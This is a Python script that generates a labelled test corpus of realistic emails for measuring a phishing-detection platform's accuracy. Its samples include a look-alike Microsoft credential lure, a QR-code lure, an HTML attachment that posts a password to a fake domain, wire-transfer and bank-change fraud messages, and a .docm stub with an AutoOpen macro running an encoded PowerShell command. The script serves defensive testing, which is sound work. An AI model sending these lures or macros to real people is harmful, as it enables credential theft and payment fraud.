"""Generate a labelled, realistic reported-email corpus for accuracy measurement.

    python scripts/build_email_corpus.py [out_dir]

Each message is a complete RFC 5322 email with realistic Received chains,
Authentication-Results, multipart HTML bodies and real attachment structures
(QR-code PNG, HTML credential form, macro-bearing .docm, ISO, invoice PDF). The
label lives in the ``X-Test-Label`` header, which the platform never reads.
"""

from __future__ import annotations

import io
import json
import sys
import zipfile
from email.message import EmailMessage
from email.utils import format_datetime, make_msgid
from datetime import datetime, timedelta, timezone
from pathlib import Path

ORG = "cci-demo.com"
T0 = datetime(2026, 9, 20, 8, 0, tzinfo=timezone.utc)


def _base(label: str, frm: str, display: str, to: str, subject: str, *, auth: str, relay: str, ip: str,
          minutes: int, reply_to: str | None = None) -> EmailMessage:
    m = EmailMessage()
    dom = frm.split("@")[1]
    when = T0 + timedelta(minutes=minutes)
    m["Received"] = (f"from {relay} ({relay} [{ip}]) by mx1.{ORG} (Postfix) with ESMTPS id 4Xyz{minutes:04d}; "
                     f"{format_datetime(when)}")
    m["Received"] = f"from mx1.{ORG} (10.0.0.25) by exch01.{ORG} (10.0.0.30); {format_datetime(when)}"
    m["Authentication-Results"] = f"mx1.{ORG}; {auth} header.from={dom}"
    m["From"] = f"\"{display}\" <{frm}>"
    m["To"] = to
    m["Subject"] = subject
    m["Date"] = format_datetime(when)
    m["Message-ID"] = make_msgid(domain=dom)
    if reply_to:
        m["Reply-To"] = reply_to
    m["X-Test-Label"] = label
    return m


def _qr_png(url: str) -> bytes:
    import qrcode

    img = qrcode.make(url)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def _docm() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document>Enable content to view the invoice</w:document>")
        z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0 Attribute VB_Name = \"ThisDocument\"\nSub AutoOpen()\n"
                                          b"Shell \"powershell -enc SQBFAFgA\"\nEnd Sub")
    return buf.getvalue()


def _pdf(text: str) -> bytes:
    body = f"BT /F1 12 Tf 72 720 Td ({text}) Tj ET"
    return (b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
            b"3 0 obj<</Type/Page/Parent 2 0 R/Contents 4 0 R>>endobj\n4 0 obj<</Length " + str(len(body)).encode() +
            b">>stream\n" + body.encode() + b"\nendstream endobj\ntrailer<</Root 1 0 R>>\n%%EOF")


def corpus() -> list[tuple[str, EmailMessage]]:
    out: list[tuple[str, EmailMessage]] = []
    u = f"jane.doe@{ORG}"

    m = _base("malicious", "security@rnicrosoft-alerts.com", "Microsoft Account Team", u,
              "Unusual sign-in activity detected on your account", auth="spf=pass dkim=none dmarc=fail",
              relay="mail.rnicrosoft-alerts.com", ip="45.155.205.77", minutes=1)
    m.set_content("We detected unusual sign-in activity. Verify your account within 24 hours or it will be locked.")
    m.add_alternative("<p>We detected an unusual sign-in to your Microsoft account.</p><p>Verify your account "
                      "<b>within 24 hours</b> or it will be locked.</p><p><a href=\"https://account-verify.rnicrosoft-"
                      "alerts.com/login?id=88231\">https://account.microsoft.com/security</a></p>", subtype="html")
    out.append(("cred_phish_lookalike", m))

    m = _base("malicious", "hr-benefits@payroll-update.support", "HR Benefits", u,
              "Action required: confirm your 2026 benefits enrolment", auth="spf=softfail dkim=none dmarc=none",
              relay="vps-2231.hostcloud.example", ip="185.244.25.18", minutes=2)
    m.set_content("Scan the QR code with your phone to confirm your benefits enrolment before Friday.")
    m.add_attachment(_qr_png("https://benefits-portal.payroll-update.support/sso?u=jane"), maintype="image",
                     subtype="png", filename="enrolment.png")
    out.append(("quishing_qr", m))

    m = _base("malicious", "no-reply@docusign-envelope.net", "DocuSign", u,
              "Jane, please review and sign: Q3 Vendor Agreement.html", auth="spf=pass dkim=pass dmarc=none",
              relay="smtp.docusign-envelope.net", ip="91.92.109.14", minutes=3)
    m.set_content("You have a document waiting for your signature. Open the attached document to sign.")
    m.add_attachment(b"<html><body><form action='https://docs-sign.docusign-envelope.net/auth.php' method='post'>"
                     b"Email <input name='u'> Password <input type='password' name='p'></form></body></html>",
                     maintype="text", subtype="html", filename="Q3_Vendor_Agreement.html")
    out.append(("html_attachment_phish", m))

    m = _base("malicious", "raj.mehta@cci-dem0.com", "Raj Mehta", f"priya.nair@{ORG}",
              "Urgent wire transfer - confidential", auth="spf=pass dkim=none dmarc=none",
              relay="mail.cci-dem0.com", ip="102.165.48.90", minutes=4, reply_to="raj.mehta.ceo@proton.example")
    m.set_content("Priya,\nI need you to process an urgent wire transfer of INR 18,40,000 to a new vendor today. "
                  "I am in a board meeting so reply by email only. Keep this confidential.\nRaj")
    out.append(("bec_ceo_fraud", m))

    m = _base("malicious", "accounts@global-freight-ltd.com", "Global Freight Accounts", f"arun.k@{ORG}",
              "Invoice INV-20931 payment overdue", auth="spf=fail dkim=none dmarc=fail",
              relay="unknown.static.example", ip="194.26.192.64", minutes=5)
    m.set_content("Please find the overdue invoice attached. Enable content to view.")
    m.add_attachment(_docm(), maintype="application", subtype="vnd.ms-word.document.macroEnabled.12",
                     filename="INV-20931.docm")
    out.append(("malspam_macro", m))

    m = _base("malicious", "dispatch@dhl-parcel-notice.top", "DHL Express", f"meera.s@{ORG}",
              "Your parcel is on hold - customs fee required", auth="spf=none dkim=none dmarc=none",
              relay="srv1.dhl-parcel-notice.top", ip="193.42.33.12", minutes=6)
    m.set_content("Your parcel could not be delivered. Open the attached label to reschedule.")
    m.add_attachment(b"CD001" + b"\x00" * 64, maintype="application", subtype="x-iso9660-image", filename="label_8841.iso")
    out.append(("iso_dropper", m))

    m = _base("spam", "offers@deals-weekly.example", "Deals Weekly", u, "70% off laptops this weekend only!",
              auth="spf=pass dkim=pass dmarc=pass", relay="mta7.deals-weekly.example", ip="198.51.100.77", minutes=7)
    m.set_content("Huge savings this weekend only. Unsubscribe any time.")
    m.add_alternative("<p>Huge savings on laptops, this weekend only!</p><p><a href=\"https://deals-weekly.example/"
                      "laptops?utm=mail\">Shop now</a> | <a href=\"https://deals-weekly.example/unsubscribe\">"
                      "Unsubscribe</a></p>", subtype="html")
    out.append(("marketing_spam", m))

    m = _base("safe", "notifications@github.com", "GitHub", u, "[cci-demo/soc-platform] Pull request #412 merged",
              auth="spf=pass dkim=pass dmarc=pass", relay="out-21.smtp.github.com", ip="192.30.252.206", minutes=8)
    m.set_content("Merged #412 into main.\n\nhttps://github.com/cci-demo/soc-platform/pull/412")
    out.append(("legit_github", m))

    m = _base("safe", f"hr@{ORG}", "CCI Human Resources", u, "Reminder: townhall on Friday at 4 pm",
              auth="spf=pass dkim=pass dmarc=pass", relay=f"exch01.{ORG}", ip="10.0.0.30", minutes=9)
    m.set_content("Hi all, reminder that the quarterly townhall is this Friday at 4 pm in the auditorium.")
    out.append(("legit_internal", m))

    m = _base("safe", "billing@azure.microsoft.com", "Microsoft Azure", u, "Your Azure invoice for September 2026",
              auth="spf=pass dkim=pass dmarc=pass", relay="mail-bn8nam12.outbound.protection.outlook.com",
              ip="40.107.237.61", minutes=10)
    m.set_content("Your invoice is available in the Azure portal: https://portal.azure.com/#blade/Billing")
    m.add_attachment(_pdf("Invoice 2026-09 total INR 1,24,000"), maintype="application", subtype="pdf",
                     filename="invoice-2026-09.pdf")
    out.append(("legit_vendor_invoice", m))

    # U18: a real supplier's mailbox is compromised - authenticated mail asking to change bank details
    m = _base("suspicious", "accounts@krishna-logistics.com", "Krishna Logistics Accounts", f"arun.k@{ORG}",
              "Updated bank details for remittance", auth="spf=pass dkim=pass dmarc=pass",
              relay="mail-sg2apc01.outbound.protection.outlook.com", ip="40.107.215.98", minutes=11)
    m.set_content("Dear Arun,\nPlease note our bank details have changed due to an audit. Kindly use the new bank "
                  "account below for the remittance of invoices KL-4471 and KL-4478 (INR 6,85,000) this week.\n"
                  "Account: 50200071234567, IFSC HDFC0001234.\nRegards,\nAccounts Team, Krishna Logistics")
    out.append(("supplier_bank_change", m))

    # U18: look-alike of the same supplier (i -> l), unauthenticated
    m = _base("malicious", "accounts@krishna-logistlcs.com", "Krishna Logistics Accounts", f"arun.k@{ORG}",
              "RE: Invoice KL-4471 - payment today", auth="spf=none dkim=none dmarc=none",
              relay="mail.krishna-logistlcs.com", ip="45.144.225.19", minutes=12)
    m.set_content("Arun,\nFollowing up on KL-4471. Our new bank account details are below; please process the bank "
                  "transfer today as the old account is frozen. Do not call, I am travelling.\nRegards,\nAccounts")
    out.append(("supplier_lookalike_payment", m))
    return out


def main(out_dir: str) -> None:
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    labels = {}
    for name, m in corpus():
        (out / f"{name}.eml").write_bytes(bytes(m))
        labels[name] = m["X-Test-Label"]
    (out / "labels.json").write_text(json.dumps(labels, indent=1), encoding="utf-8")
    print(f"{len(labels)} messages -> {out}")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else str(Path(__file__).resolve().parents[1] / "artifacts" / "phishing" / "corpus"))
